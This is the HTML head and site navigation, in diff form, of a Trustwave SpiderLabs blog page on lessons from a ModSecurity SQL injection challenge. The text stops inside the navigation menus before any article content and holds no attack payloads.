@@ -1,0 +1,1601 @@
+
+
+
+
+
+
+<!DOCTYPE html>
+<html class="no-js" lang="en-US">
+<head>
+
+
+<script>
+    (function (w, d, s, l, i) {
+        w[l] = w[l] || []; w[l].push({
+            'gtm.start':
+                new Date().getTime(), event: 'gtm.js'
+        }); var f = d.getElementsByTagName(s)[0],
+            j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+                'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+    })(window, document, 'script', 'dataLayer', 'GTM-54M2ZJN');</script>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow" />
+<meta name="rights" content="© Copyright Trustwave 2020" />
+<link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192" href="/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+<meta name="theme-color" content="#ed1a3d">
+<meta name="msvalidate.01" content="B5B6397DC5AEABDCC2BD2A5D1872960D" />
+<title>ModSecurity SQL Injection Challenge: Lessons Learned | Trustwave | SpiderLabs | Trustwave</title>
+<meta name="description" content="This is a post-mortem blog post to discuss the successful Level II evasions found by participants during the recent ModSecurity SQL Injection Challenge. First of all, I would like to thank all those people that participated in the challenge. All...">
+
+<link rel="alternate" href="/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/" hreflang="x-default"/>
+
+<link rel="canonical" href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/" />
+<meta property="og:url" content="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Trustwave" />
+<meta property="og:image" content="https://trustwave.azureedge.net/media/15281/generic-default-image.jpg?rnd=131897043920000000" />
+<meta property="og:title" content="ModSecurity SQL Injection Challenge: Lessons Learned" />
+<meta property="og:description" content="This is a post-mortem blog post to discuss the successful Level II evasions found by participants during the recent ModSecurity SQL Injection Challenge. First of all, I would like to thank all those people that participated in the challenge. All..." />
+<link type="text/css" rel="stylesheet" href="//fast.fonts.net/cssapi/9c85e15b-99ed-40a4-929d-2262f9ed2706.css" />
+<!-- CSS & JS -->
+<link rel="stylesheet" type="text/css" href="/dist/css/styles.min.css?v=33sa">
+
+<!--[if lt IE 9]>
+  <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+  <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+<![endif]-->
+<script type='text/javascript'>
+    var appInsights = window.appInsights || function (config) {
+        function r(config) { t[config] = function () { var i = arguments; t.queue.push(function () { t[config].apply(t, i) }) } }
+        var t = { config: config }, u = document, e = window, o = 'script', s = u.createElement(o), i, f; for (s.src = config.url || '//az416426.vo.msecnd.net/scripts/a/ai.0.js', u.getElementsByTagName(o)[0].parentNode.appendChild(s), t.cookie = u.cookie, t.queue = [], i = ['Event', 'Exception', 'Metric', 'PageView', 'Trace', 'Ajax']; i.length;)r('track' + i.pop()); return r('setAuthenticatedUserContext'), r('clearAuthenticatedUserContext'), config.disableExceptionTracking || (i = 'onerror', r('_' + i), f = e[i], e[i] = function (config, r, u, e, o) { var s = f && f(config, r, u, e, o); return s !== !0 && t['_' + i](config, r, u, e, o), s }), t
+    }({
+        instrumentationKey: "d8139253-6e32-4606-9657-fe02425cfe56"
+    });
+
+    window.appInsights = appInsights;
+    appInsights.trackPageView();
+</script>
+<script src='https://www.google.com/recaptcha/api.js'></script>
+<script src='https://www.google.com/recaptcha/api.js?render=6LdMtIkUAAAAAP7FCbfNuAv_bvJRl7vsAjPIyOWc'></script>
+
+            <link rel="amphtml" href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/?amp=1">
+
+
+    <script>
+var SThreshold = 0.5;var globalmktoid = 0;var globalpartnerform = false;var globalfooterform = true;
+
+    </script>
+
+</head>
+<body  class="site-wrapper site-header-light">
+
+    <!--[if lte IE 9]>
+      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+    <![endif]-->
+    <!-- Google Tag Manager (noscript) -->
+    <noscript>
+        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-54M2ZJN"
+                height="0" width="0" style="display:none;visibility:hidden"></iframe>
+    </noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+
+
+
+<header class="site-header" itemscope itemtype="http://www.schema.org/SiteNavigationElement">	
+	<div class="site-header-container-mobile">
+		<div class="site-header-content-mobile">
+            <nav>
+                <button class="site-header-toggle-drawer-open"><i class="material-icons">menu</i></button>
+                <div class="site-header-brand-wrapper-mobile">
+                    <a href="/en-us/" class="site-header-brand-mobile"><span>Trustwave</span></a>
+                </div>
+                
+                <a href="/en-us/search/" class="site-header-toggle-search-open"><i class="material-icons">search</i></a>
+            </nav>
+		</div>
+	</div>
+	<div class="site-header-container-backdrop"></div>
+	<div class="site-header-container">
+		<div class="site-header-brand-wrapper-drawer">
+			<a href="/en-us/" class="site-header-brand-drawer"><span>Trustwave</span></a>
+			<button class="site-header-toggle-drawer-close"><i class="material-icons">close</i></button>
+		</div>
+        <div class="site-header-content">
+            <div class="site-header-content-top">
+                <nav>
+                                    <div class="site-header-alert">
+                                        <p>
+                                                <i class="material-icons">error_outline</i>
+                                            
+
+                                            <a href="/en-us/covid-19/" data-ga-hittype="event" data-ga-action="Click" data-ga-category="Alert Bar" data-ga-label="COVID-19 Pandemic - Alert Bar">COVID-19 and Your Cybersecurity</a>
+                                        </p>
+                                    </div>
+
+                    <ul>
+                        <li><a href="/en-us/company/contact/">Contact</a></li>
+                        <li><a href="/en-us/company/support/">Support</a></li>
+                        <li>
+                            <div class="site-header-content-top-backdrop"></div>
+                            <button data-toggle="#drawer-login">Login</button>
+                            <div class="site-header-content-top-dropdown" id="dropdown-login">
+                                <nav>
+                                    <h4>Login to your Trustwave Fusion Platform Account</h4>
+                                    <p><a href="https://fusion.trustwave.com" target="_blank" class="btn btn-primary btn-block">Fusion Platform</a></p>
+                                    <ul>
+                                        <li><a href="/en-us/company/about-us/trustwave-fusion-platform/">What is the Trustwave Fusion Platform?</a></li>
+                                        <li><a href="https://segconsole.trustwave.com/" target="_blank">Login to SEG Cloud Portal</a></li>
+                                        <li><a href="https://login.trustwave.com/portal-core/home" target="_blank">Legacy TrustKeeper Login</a></li>
+                                    </ul>
+                                </nav>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="site-header-content-top-backdrop"></div>
+                            <button data-toggle="#drawer-language"><i class="material-icons">language</i> English</button>
+                            <div class="site-header-content-top-dropdown" id="dropdown-language">
+                                <nav>
+                                    <ul class="langpicker">
+                                        <li><a href="/de-de/" data-loc="/de-de/" data-lang="de-de" value="de-de">German (Deutsche)</a></li>
+                                        <li><a href="/ja-jp/" data-loc="/ja-jp/" data-lang="ja-jp" value="ja-jp">Japanese (日本語)</a></li>
+                                    </ul>
+                                </nav>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="site-header-content-top-backdrop"></div>
+                            <span><button class="btn btn-sm btn-primary btn-block" data-toggle="#drawer-ir">Incident Response</button></span>
+                            <div class="site-header-content-top-dropdown" id="dropdown-ir">
+                                <nav>
+                                    <h4>Experiencing a security breach?</h4>
+                                    <p>Get access to immediate incident response assistance.</p>
+                                    <h2>24 Hour Hotlines</h2>
+                                    <ul>
+                                        <li><h5>Americas</h5><h4>+1 (312) 598-1431</h4></li>
+                                        <li><h5>EMEA</h5><h4>+44 175 477-2059</h4></li>
+                                        <li><h5>Australia</h5><h4>1800 401 792</h4></li>
+                                        <li><h5>Singapore</h5><h4>800 101 3355</h4></li>
+                                    </ul>
+                                    <div style="padding: 0 60px;">
+                                        <a href="/en-us/company/contact/security-breach/" class="btn btn-primary btn-block">Recommended Actions</a>
+                                    </div>
+                                </nav>
+                            </div>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+            <div class="site-header-content-top-drawer" id="drawer-login">
+                <nav>
+                    <button><i class="material-icons">chevron_left</i> Back</button>
+                    <div>
+                        <h4>Login to your Trustwave Fusion Platform Account</h4>
+                        <p><a href="https://fusion.trustwave.com" target="_blank" class="btn btn-primary btn-block">Fusion Platform</a></p>
+                        <ul>
+                            <li><a href="/en-us/company/about-us/trustwave-fusion-platform/">What is the Trustwave Fusion Platform?</a></li>
+                            <li><a href="https://segconsole.trustwave.com/" target="_blank">Login to SEG Cloud Portal</a></li>
+                            <li><a href="https://login.trustwave.com/portal-core/home" target="_blank">Legacy TrustKeeper Login</a></li>
+                        </ul>
+                    </div>
+                </nav>
+            </div>
+            <div class="site-header-content-top-drawer" id="drawer-language">
+                <nav>
+                    <button><i class="material-icons">chevron_left</i> Back</button>
+                    <div>
+                        <ul class="langpicker">
+                            <li><a href="/de-de/" data-loc="/de-de/" data-lang="de-de" value="de-de">DE - German (Deutsche)</a></li>
+                            <li><a href="/ja-jp/" data-loc="/ja-jp/" data-lang="ja-jp" value="ja-jp">JP - Japanese (日本語)</a></li>
+                        </ul>
+                    </div>
+                </nav>
+            </div>
+            <div class="site-header-content-top-drawer" id="drawer-ir">
+                <nav>
+                    <button><i class="material-icons">chevron_left</i> Back</button>
+                    <div>
+                        <h4>Experiencing a security breach?</h4>
+                        <p>Get access to immediate incident response assistance.</p>
+                        <h2>24 Hour Hotlines</h2>
+                        <ul>
+                            <li><h5>Americas</h5><h4>+1 (312) 598-1431</h4></li>
+                            <li><h5>EMEA</h5><h4>+44 175 477-2059</h4></li>
+                            <li><h5>Australia</h5><h4>1800 401 792</h4></li>
+                            <li><h5>Singapore</h5><h4>800 101 3355</h4></li>
+                        </ul>
+                        <div style="padding: 0 15px;">
+                            <a href="/en-us/company/contact/security-breach/" class="btn btn-primary btn-block">Recommended Actions</a>
+                        </div>
+                    </div>
+                </nav>
+            </div>
+            <div class="site-header-content-main">
+                <nav>
+                    <div class="site-header-brand-wrapper-desktop">
+                        <a href="/en-us/" class="site-header-brand-desktop"><span>Trustwave</span></a>
+                    </div>
+                    <ul>
+                        <li><a href="/en-us/services/">Services</a><button data-toggle="#dropdown-services"><i class="material-icons">chevron_right</i></button></li>
+                        <li><a href="/en-us/capabilities/">Capabilities</a><button data-toggle="#dropdown-capabilites"><i class="material-icons">chevron_right</i></button></li>
+                        <li><a href="/en-us/resources/">Resources</a><button data-toggle="#dropdown-resources"><i class="material-icons">chevron_right</i></button></li>
+                        <li><a href="/en-us/company/">Company</a><button data-toggle="#dropdown-company"><i class="material-icons">chevron_right</i></button></li>
+                    </ul>
+                    
+                    <a href="/en-us/search/" class="site-header-toggle-search-open"><i class="material-icons">search</i></a>
+                </nav>
+            </div>
+            <div class="site-header-content-dropdown" id="dropdown-services">
+                <div class="site-header-content-dropdown-container">
+                    <nav>
+                        <button><i class="material-icons">chevron_left</i> Back</button>
+                        <a href="/en-us/services/">Services</a>
+                        <ul>
+                            <li><a itemprop="url" href="/en-us/services/managed-security/"><span itemprop="name">Managed Security</span></a><button data-toggle="#services-tab-content-1"><i class="material-icons">chevron_right</i></button></li>
+                            <li><a itemprop="url" href="/en-us/services/security-testing/"><span itemprop="name">Security Testing</span></a><button data-toggle="#services-tab-content-2"><i class="material-icons">chevron_right</i></button></li>
+                            <li><a itemprop="url" href="/en-us/services/technology/"><span itemprop="name">Technology</span></a><button data-toggle="#services-tab-content-3"><i class="material-icons">chevron_right</i></button></li>
+                            <li><a itemprop="url" href="/en-us/services/consulting/"><span itemprop="name">Consulting</span></a><button data-toggle="#services-tab-content-4"><i class="material-icons">chevron_right</i></button></li>
+                            <li><a itemprop="url" href="/en-us/services/education/"><span itemprop="name">Education</span></a><button data-toggle="#services-tab-content-5"><i class="material-icons">chevron_right</i></button></li>
+                        </ul>
+                        <section>
+                            <nav id="services-tab-content-1">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/services/managed-security/">Managed Security</a>
+                                <ul class="two-thirds">
+                                    <li><a itemprop="url" href="/en-us/services/managed-security/managed-threat-detection-and-response/"><span itemprop="name">Managed Threat Detection &amp; Response</span><span>Proactively hunt for, investigate and eradicate cyberthreats, 24x7.</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/managed-security/proactive-threat-hunting/"><span itemprop="name">Proactive Threat Hunting</span><span>Identify existing attackers in your environment and reduce dwell time</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/managed-security/security-technology/"><span itemprop="name">Security Technology Management</span><span>An arrangement to handle the day-to-day management of your infosec</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/managed-security/security-and-compliance-bundles/"><span itemprop="name">Security and Compliance Bundles</span><span>Solution packages to address needs from validation to full network security</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/managed-security/managed-web-application-firewall/"><span itemprop="name">Managed Web Application Firewall</span><span>Keep your mission critical web applications secure with a Managed WAF</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/managed-security/application-control/"><span itemprop="name">Managed Application Control</span> <span>Endpoint allowlisting with real-time threat intelligence and monitoring</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/managed-security/telco-security/"><span itemprop="name">Telco Security</span><span>DDOS & broadband protection for APAC businesses and delivered by Singtel</span></a></li>
+                                </ul>
+                                <aside class="one-third">
+
+        <div class="card">
+                <div class="card-media">
+                    <a href="/en-us/resources/library/documents/the-forrester-wave-global-managed-security-services-providers-q3-2020/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TheForresterWaveGlobalManagedSecurityServicesProvidersQ" data-ga-value="1">
+                        <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/16992/reprint_the-forrester-wave_global-managed-security-services-providers_q3-2020-cover.png?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=132404200250000000);"></span>
+                    </a>
+                </div>
+
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                <p class="mbx">Jul 28, 2020</p>
+                <h4 class="mbn">
+                    <a href="/en-us/resources/library/documents/the-forrester-wave-global-managed-security-services-providers-q3-2020/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TheForresterWaveGlobalManagedSecurityServicesProvidersQ" data-ga-value="1">The Forrester Wave™: Global Managed Security Services Providers, Q3 2020</a>
+                </h4>
+            </div>
+            <div class="card-footer">
+                <span class="text-sm text-uppercase text-muted">Analyst Report</span>
+            </div>
+        </div>
+
+                                </aside>
+                            </nav>
+                            <nav id="services-tab-content-2">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/services/security-testing/">Security Testing</a>
+                                <ul class="two-thirds">
+                                    <li><a itemprop="url" href="/en-us/services/security-testing/security-testing-suite/"><span itemprop="name">Security Testing Services </span><span>Comprehensive suite of security testing capabilities managed within a unified portal</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/consulting/spiderlabs-consulting/"><span itemprop="name">Trustwave SpiderLabs</span><span>An elite group of researchers, penetration testers and incident responders</span></a></li>
+                                </ul>
+                                <aside class="one-third">
+
+        <div class="card">
+                <div class="card-media">
+                    <a href="/en-us/resources/library/documents/once-and-future-threats-what-security-testing-is-and-will-be/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="OnceandFutureThreatsWhatSecurityTestingIsandWillBe" data-ga-value="1">
+                        <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/16795/once-future-cover-image.png?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=132344863110000000);"></span>
+                    </a>
+                </div>
+
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                <p class="mbx">May 20, 2020</p>
+                <h4 class="mbn">
+                    <a href="/en-us/resources/library/documents/once-and-future-threats-what-security-testing-is-and-will-be/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="OnceandFutureThreatsWhatSecurityTestingIsandWillBe" data-ga-value="1">Once and Future Threats: What Security Testing Is and Will Be</a>
+                </h4>
+            </div>
+            <div class="card-footer">
+                <span class="text-sm text-uppercase text-muted">Ebook</span>
+            </div>
+        </div>
+
+                                </aside>
+                            </nav>
+                            <nav id="services-tab-content-3">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/services/technology/">Technology</a>
+                                <ul class="two-thirds">
+                                    <li><a itemprop="url" href="/en-us/services/technology/dbprotect/"><span itemprop="name">DbProtect </span><span>Scalable enterprise platform to monitor & protect databases and big data stores</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/technology/appdetectivepro/"><span itemprop="name">AppDetectivePRO </span><span>Database and big data scanner to find weaknesses that could lead to compromise</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/technology/secure-email-gateway/"><span itemprop="name">Secure Email Gateway </span><span>Full protection against email threats and sensitive data from exiting</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/technology/secure-web-gateway/"><span itemprop="name">Secure Web Gateway </span><span>Flexible solution to guard in real time against internet-borne threats </span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/technology/intrusion-detection-and-prevention/"><span itemprop="name">Intrusion Detection &amp; Prevention </span><span>A high-speed solution that monitors your network & helps fortify the perimeter </span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/technology/next-generation-firewall/"><span itemprop="name">Next Generation Firewall </span><span>Comprehensive network security with a low total cost of ownership</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/partner-ecosystem/global-solution-partners/"><span itemprop="name">Technology Partners </span><span>Key Partners who augment the broad portfolio of security services</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/consulting/technology-and-implementation-services/"><span itemprop="name">Technology &amp; Implementation </span><span>Experts help determine the right assortment of technologies for your business</span></a></li>
+                                </ul>
+                                <aside class="one-third">
+
+        <div class="card">
+                <div class="card-media">
+                    <a href="/en-us/resources/library/documents/the-underground-economy/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TheUndergroundEconomy" data-ga-value="1">
+                        <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/16254/the-underground-economy-cover.png?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=132094902880000000);"></span>
+                    </a>
+                </div>
+
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                <p class="mbx">Aug 05, 2019</p>
+                <h4 class="mbn">
+                    <a href="/en-us/resources/library/documents/the-underground-economy/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TheUndergroundEconomy" data-ga-value="1">The Underground Economy</a>
+                </h4>
+            </div>
+            <div class="card-footer">
+                <span class="text-sm text-uppercase text-muted">Ebook</span>
+            </div>
+        </div>
+
+                                </aside>
+                            </nav>
+                            <nav id="services-tab-content-4">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/services/consulting/">Consulting</a>
+                                <ul class="two-thirds">
+                                    <li><a itemprop="url" href="/en-us/services/consulting/digital-forensics-and-incident-response/"><span itemprop="name">Digital Forensics &amp; IR </span><span>Service that provides breach training and immediate response to incidents </span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/consulting/threat-detection-and-response-consulting/"><span itemprop="name">Threat Detection &amp; Response Consulting </span><span>Advisory, transformation, and operations enablement consulting services</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/consulting/data-protection-consulting/"><span itemprop="name">Data Protection </span><span>Complete lifecycle management services for database security</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/consulting/cybersecurity-and-risk/"><span itemprop="name">Cybersecurity &amp; Risk </span><span>Advisors determine your security gaps and risk appetite to make better decisions </span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/consulting/spiderlabs-consulting/"><span itemprop="name">Trustwave SpiderLabs </span><span>An elite group of researchers, penetration testers and incident responders</span></a></li>
+                                    <li><a itemprop="url" href="http://www.securitycolony.com/" target="_blank"><span itemprop="name">Security Colony </span><span>Big or small – your problem has been faced before. Like a CISO in your pocket</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/consulting/technology-and-implementation-services/"><span itemprop="name">Technology &amp; Implementation </span><span>Experts help determine the right assortment of technologies for your business</span></a></li>
+                                </ul>
+                                <aside class="one-third">
+
+        <div class="card">
+                <div class="card-media">
+                    <a href="/en-us/resources/library/documents/cyber-resiliency-in-the-multi-cloud-era/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="CyberResiliencyintheMultiCloudEra" data-ga-value="1">
+                        <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/16414/cyber-multicloud-ebook-cover-image.png?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=132176020710000000);"></span>
+                    </a>
+                </div>
+
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                <p class="mbx">Nov 07, 2019</p>
+                <h4 class="mbn">
+                    <a href="/en-us/resources/library/documents/cyber-resiliency-in-the-multi-cloud-era/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="CyberResiliencyintheMultiCloudEra" data-ga-value="1">Cyber Resiliency in the Multi-Cloud Era</a>
+                </h4>
+            </div>
+            <div class="card-footer">
+                <span class="text-sm text-uppercase text-muted">Ebook</span>
+            </div>
+        </div>
+
+                                </aside>
+                            </nav>
+                            <nav id="services-tab-content-5">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/services/education/">Education</a>
+                                <ul class="one-third">
+                                    <li><a itemprop="url" href="/en-us/services/education/executive-training-programs-and-services/"><span itemprop="name">Executive Training Programs </span><span>Programs and services to help senior leaders make risk-based security decisions</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/education/cybersecurity-awareness-training/"><span itemprop="name">Cybersecurity Awareness Training </span><span>Industry-leading course content for general employees and developers</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/services/education/tactical-training-programs-and-services/"><span itemprop="name">Tactical Training Programs </span><span>Instruction for building attack defense and response that excels in the real world</span></a></li>
+                                </ul>
+                                <aside class="two-thirds">
+                                    <div class="row card-list">
+
+                                                <div class="col-lg-6 card-list-item">
+
+        <div class="card">
+                <div class="card-media">
+                    <a href="/en-us/resources/library/documents/the-complete-guide-to-building-a-security-culture/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TheCompleteGuidetoBuildingaSecurityCulture" data-ga-value="1">
+                        <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/15106/ierr37pw.png?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131992175790000000);"></span>
+                    </a>
+                </div>
+
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                <p class="mbx">Oct 30, 2017</p>
+                <h4 class="mbn">
+                    <a href="/en-us/resources/library/documents/the-complete-guide-to-building-a-security-culture/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TheCompleteGuidetoBuildingaSecurityCulture" data-ga-value="1">The Complete Guide to Building a Security Culture</a>
+                </h4>
+            </div>
+            <div class="card-footer">
+                <span class="text-sm text-uppercase text-muted">Ebook</span>
+            </div>
+        </div>
+
+                                                </div>
+                                                <div class="col-lg-6 card-list-item">
+
+        <div class="card">
+                <div class="card-media">
+                    <a href="/en-us/resources/blogs/trustwave-blog/9-ways-to-create-a-security-awareness-program-people-won-t-hate/">
+                        <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/7356/7145.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131644845120000000);" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="WaystoCreateaSecurityAwarenessProgramPeopleWontHate" data-ga-value="1"></span>
+                    </a>
+                </div>
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                    <p class="mbx">Oct 07, 2015</p>
+                <h4 class="mbn"><a href="/en-us/resources/blogs/trustwave-blog/9-ways-to-create-a-security-awareness-program-people-won-t-hate/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="WaystoCreateaSecurityAwarenessProgramPeopleWontHate" data-ga-value="1">9 Ways to Create a Security Awareness Program People Won’t Hate</a></h4>
+            </div>
+                <div class="card-footer"><span class="text-sm text-uppercase text-muted">Tips &amp; Tricks</span></div>
+        </div>
+
+                                                </div>
+
+                                    </div>
+                                </aside>
+                            </nav>
+                        </section>
+                    </nav>
+                </div>
+            </div>
+            <div class="site-header-content-dropdown" id="dropdown-capabilites">
+                <div class="site-header-content-dropdown-container">
+                    <nav>
+                        <button><i class="material-icons">chevron_left</i> Back</button>
+                        <a href="/en-us/capabilities/">Capabilites</a>
+                        <ul>
+                            <li><a itemprop="url" href="/en-us/capabilities/by-topic/"><span itemprop="name">By Topic</span></a><button data-toggle="#capabilities-tab-content-3"><i class="material-icons">chevron_right</i></button></li>
+                            <li><a itemprop="url" href="/en-us/capabilities/by-industry/"><span itemprop="name">By Industry</span></a><button data-toggle="#capabilities-tab-content-1"><i class="material-icons">chevron_right</i></button></li>
+                            <li><a itemprop="url" href="/en-us/capabilities/by-mandate/"><span itemprop="name">By Mandate</span></a><button data-toggle="#capabilities-tab-content-2"><i class="material-icons">chevron_right</i></button></li>
+                        </ul>
+                        <section>
+                            <nav id="capabilities-tab-content-3">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/capabilities/by-topic/">By Topic</a>
+                                <ul class="two-thirds">
+
+<li><a itemprop='url' href='/en-us/capabilities/by-topic/securing-data/' target='_self' data-ga-hittype="event" data-ga-category="menu_link" data-ga-action="click" data-ga-label="SecuringData" data-ga-value="1"><span itemprop='name'>Securing Data</span><span>Protect data. Secure databases. Sustain compliance.</span></a></li>
+<li><a itemprop='url' href='/en-us/covid-19/' target='_self' data-ga-hittype="event" data-ga-category="menu_link" data-ga-action="click" data-ga-label="COVIDPandemic" data-ga-value="1"><span itemprop='name'>COVID-19 Pandemic</span><span>Security resources, recommendations and strategies that offer you help and guidance</span></a></li>
+<li><a itemprop='url' href='/en-us/capabilities/by-topic/rapidly-secure-temporary-infrastructures/' target='_self' data-ga-hittype="event" data-ga-category="menu_link" data-ga-action="click" data-ga-label="RapidlySecureNewEnvironments" data-ga-value="1"><span itemprop='name'>Rapidly Secure New Environments</span><span>Secure new environments in rapid response situations</span></a></li>
+
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-topic/detecting-and-responding-to-threats/"><span itemprop="name">Detecting &amp; Responding to Threats </span><span>Monitor, proactively hunt for, investigate and remediate cyberthreats, 24x7</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-topic/securing-email-and-web-gateways/"><span itemprop="name">Securing Email &amp; Web Gateways </span><span>Protect against threats that strike when users encounter malicious content</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-topic/cloud-security/"><span itemprop="name">Securing the Cloud </span><span>Safely navigate to and stay protected in the cloud</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-topic/scanning-and-testing-for-vulnerabilities/"><span itemprop="name">Scanning &amp; Testing </span><span>Get insights on your risk exposure</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-topic/securing-the-iot-landscape/"><span itemprop="name">Securing the IoT Landscape</span><span>Test, monitor and secure everyday objects connected to your company’s network</span></a></li>
+                                </ul>
+                                <aside class="one-third">
+
+        <div class="card">
+                <div class="card-media">
+                    <a href="/en-us/resources/library/documents/gartner-report-ask-these-critical-questions-and-consider-these-risks-when-selecting-an-mdr-provider/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="GartnerReportAskTheseCriticalQuestionsandConsiderTheseRisksWhenSelectinganMDRProvider" data-ga-value="1">
+                        <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/16657/gartner-mdr-cover.png?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=132308413190000000);"></span>
+                    </a>
+                </div>
+
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                <p class="mbx">Apr 08, 2020</p>
+                <h4 class="mbn">
+                    <a href="/en-us/resources/library/documents/gartner-report-ask-these-critical-questions-and-consider-these-risks-when-selecting-an-mdr-provider/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="GartnerReportAskTheseCriticalQuestionsandConsiderTheseRisksWhenSelectinganMDRProvider" data-ga-value="1">Gartner Report: Ask These Critical Questions and Consider These Risks When Selecting an MDR Provider</a>
+                </h4>
+            </div>
+            <div class="card-footer">
+                <span class="text-sm text-uppercase text-muted">Analyst Report</span>
